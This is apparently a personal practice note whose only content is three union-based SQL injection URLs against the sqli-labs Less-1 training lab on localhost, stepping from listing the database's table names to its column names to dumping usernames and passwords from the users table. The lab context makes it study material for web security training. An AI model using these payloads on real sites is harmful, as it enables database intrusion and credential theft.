---
abbrlink: ''
categories: []
date: '2025-03-22T11:10:13.979458+08:00'
tags: []
title: title
updated: '2025-03-22T11:10:16.653+08:00'
---
```
http://localhost/sqli-labs/Less-1/index.php?id=a' union select 1,2,GROUP_CONCAT(TABLE_NAME) from information_schema.tables where TABLE_SCHEMA=database()  --+
```

```
http://localhost/sqli-labs/Less-1/index.php?id=a' union select 1,2,GROUP_CONCAT(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA=database() and TABLE_NAME='users' --+
```

```
http://localhost/sqli-labs/Less-1/index.php?id=a' union select 1,2,GROUP_CONCAT(username,"-",password) from users --+
```
